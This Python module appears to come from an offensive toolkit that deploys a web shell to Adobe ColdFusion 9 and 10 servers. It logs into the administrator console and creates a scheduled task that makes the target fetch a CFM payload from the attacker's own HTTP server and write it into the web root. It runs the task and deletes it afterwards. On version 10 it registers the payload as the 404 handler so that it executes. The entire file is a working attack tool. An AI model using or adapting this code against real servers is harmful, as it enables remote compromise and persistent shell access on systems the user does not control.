from src.platform.coldfusion.interfaces import CINTERFACES
from src.platform.coldfusion.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, parse_war_path
from os.path import abspath
from log import LOG
from threading import Thread
from re import findall
from time import sleep
from os import system
import state
import utility


title = CINTERFACES.CFM
versions = ['9.0', '10.0'] # needs testing for older versions
def deploy(fingerengine, fingerprint):
    """
    """

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    if fingerprint.version in ["10.0"]:
        # we need the file to end with .log
        tmp = cfm_file.split('.')[0]
        system("cp %s %s/%s.log" % (cfm_path, state.serve_dir, tmp))
        cfm_file = "%s.log" % tmp 
        cfm_path = "%s/%s" % (state.serve_dir, cfm_file)

    utility.Msg("Preparing to deploy {0}...".format(cfm_file))
    utility.Msg("Fetching web root...", LOG.DEBUG)

    # fetch web root; this is where we stash the file
    root = fetch_webroot(dip, fingerprint)
    if not root:
        utility.Msg("Unable to fetch web root.", LOG.ERROR)
        return

    # create the scheduled task
    utility.Msg("Web root found at %s" % root, LOG.DEBUG)
    utility.Msg("Creating scheduled task...")

    if not create_task(dip, fingerprint, cfm_file, root):
        return 

    # invoke the task
    utility.Msg("Task %s created, invoking task..." % cfm_file)
    run_task(dip, fingerprint, cfm_path)

    # remove the task
    utility.Msg("Cleaning up...")
    delete_task(dip, fingerprint, cfm_file)

    if fingerprint.version in ["10.0"]:
        # set the template 404 handler
        set_template(dip, fingerprint, root, cfm_file)


def create_task(ip, fingerprint, cfm_file, root):
    """ Create the task
    """

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduleedit.cfm".\
                                                    format(ip, fingerprint.port)

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    data = {
            "csrftoken" : csrf,
            "TaskName" : cfm_file,
            "Start_Date" : "Jan 27, 2014", # shouldnt matter since we force run
            "ScheduleType" : "Once",
            "StartTimeOnce" : "9:56 PM", # see above
            "Operation" : "HTTPRequest",
            "ScheduledURL" : "http://{0}:8000/{1}".format(utility.local_address(), cfm_file),
            "publish" : "1",
            "publish_file" : root + "\\" + cfm_file, # slash on OS?
            "adminsubmit" : "Submit"
           }

    if fingerprint.version in ["10.0"]:
        data['publish_overwrite'] = 'on'

    response = utility.requests_get(url, cookies=cookie)
    if response.status_code is 200:

        # create task
        response = utility.requests_post(url, data=data, cookies=cookie,
                        headers={'Content-Type':'application/x-www-form-urlencoded'})
        if response.status_code is 200:
            return True


def delete_task(ip, fingerprint, cfm_file):
    """ Once we run the task and pop our shell, we need to remove the task
    """

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm".\
                                                format(ip, fingerprint.port)

    if fingerprint.version in ["9.0"]:
        uri = "?action=delete&task={0}&csrftoken={1}"
    elif fingerprint.version in ["10.0"]:
        uri = "?action=delete&task={0}&group=default&mode=server&csrftoken={1}"

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    response = utility.requests_get(url + uri.format(cfm_file, csrf), cookies=cookie)
    if not response.status_code is 200:
        utility.Msg("Failed to remove task.  May require manual removal.", LOG.ERROR)


def run_task(ip, fingerprint, cfm_path):
    """ Invoke the task and wait for the remote server to fetch
    our file
    """

    cfm_name = parse_war_path(cfm_path, True)
        
    # kick up the HTTP server
    server_thread = Thread(target=_serve, args=(cfm_path,))
    server_thread.start()
    sleep(2)

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm"\
                                                  .format(ip, fingerprint.port)

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    
    if fingerprint.version in ["9.0"]:
        uri = "?runtask={0}&timeout=0&csrftoken={1}".format(cfm_name, csrf)
    elif fingerprint.version in ["10.0"]:
        uri = "?runtask={0}&group=default&mode=server&csrftoken={1}".format(cfm_name, csrf)

    response = utility.requests_get(url + uri, cookies=cookie)
    if waitServe(server_thread):
        utility.Msg("{0} deployed to /CFIDE/{0}".format(cfm_name), LOG.SUCCESS)

    try:
        utility.requests_get("http://localhost:8000", timeout=1)
    except:
        pass


def fetch_csrf(ip, fingerprint, url):
    """ Most of these requests use a CSRF; we can grab this so long as
    we send the request using the same session token.

    Returns a tuple of (cookie, csrftoken)
    """

    # lets try and fetch CSRF
    cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
    if cookies:
        response = utility.requests_get(url, cookies=cookies[0])
    else:
        utility.Msg("Could not get auth for %s:%s" % (ip, fingerprint.port), LOG.ERROR)
        return False

    if response.status_code is 200:

        token = findall("name=\"csrftoken\" value=\"(.*?)\">", response.content)
        if len(token) > 0:
            return (cookies[0], token[0])
        else:
            utility.Msg("CSRF appears to be disabled.")
            return (cookies[0], None)


def fetch_webroot(ip, fingerprint):
    """ Pick out the web root from the settings summary page 
    """

    url = "http://{0}:{1}/CFIDE/administrator/reports/index.cfm"\
                                        .format(ip, fingerprint.port)

    cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
    if cookies:
        req = utility.requests_get(url, cookies=cookies[0])
    else:
        utility.Msg("Could not get auth for %s:%s" % (ip, fingerprint.port), LOG.ERROR)
        return False

    if req.status_code is 200:

        data = findall("CFIDE &nbsp;</td><td scope=row class=\"cellRightAndBottomBlueSide\">(.*?)</td>",
                            req.content.translate(None, "\n\t\r"))

        if len(data) > 0:
            return data[0].replace("&#x5c;", "\\").replace("&#x3a;", ":")[:-7]
        else:
            return False


def set_template(ip, fingerprint, root, cfm_file):
    """ ColdFusion 10.x+ doesn't allow us to simply schedule a task to obtain
    a CFM shell; instead, we deploy the payload with a .log extension, then set
    the file as the 404 handler.  We can then trigger a 404 to invoke our payload.
    """

    url = "http://{0}:{1}/CFIDE/administrator/settings/server_settings.cfm"\
                                .format(ip, fingerprint.port)

    template_handler = '/' + root.rsplit('\\', 1)[1] + '/' + cfm_file
    (cookie, csrftoken) = fetch_csrf(ip, fingerprint, url)
    data = {
            "csrftoken" : csrftoken,
            "LimitTime" : "true",
            "MaxSeconds": 60,
            "enablePerAppSettings" : 1,
            "uuidtoken" : 1,
            "enablehttpst" : 1,
            "WsEnable" : 1,
            "secureJSONPrefix" : "//",
            "outputBufferMax" : 1024,
            "enableInMemoryFileSystem" : 1,
            "inMemoryFileSystemLimit" : 100,
            "inMemoryFileSystemApplicationLimit" : 20,
            "WatchInterval" : 120,
            "globalScriptProtect" : "FORM,URL,COOKIE,CGI",
            "allowExtraAttributesInAttrColl" : 1,
            "cFaaSGeneratedFilesExpiryTime" : 30,
            "ORMSearchIndexDirectory" : "",
            "CFFORMScriptSrc" : "/CFIDE/scripts/",
            "GoogleMapKey" : "",
            "serverCFC" : "Server",
            "applicationCFCLookup" : 1,
            "MissingTemplateHandler" : template_handler,
            "SiteWideErrorHandler" : "",
            "postParametersLimit" : 100,
            "postSizeLimit" : 20,
            "throttleThreshold" : 4,
            "throttleMemory" : 200,
            "adminsubmit" : "Submit Changes"
           }

    response = utility.requests_post(url, data=data, cookies=cookie)

    if response.status_code == 200:
        if "missing template handler does not exist" in response.content:
            utility.Msg("Failed to set handler; invoked file not found.", LOG.ERROR)
        else:
            utility.Msg("Deployed.  Access /CFIDE/ad123.cfm for your payload.", LOG.SUCCESS)
        return True
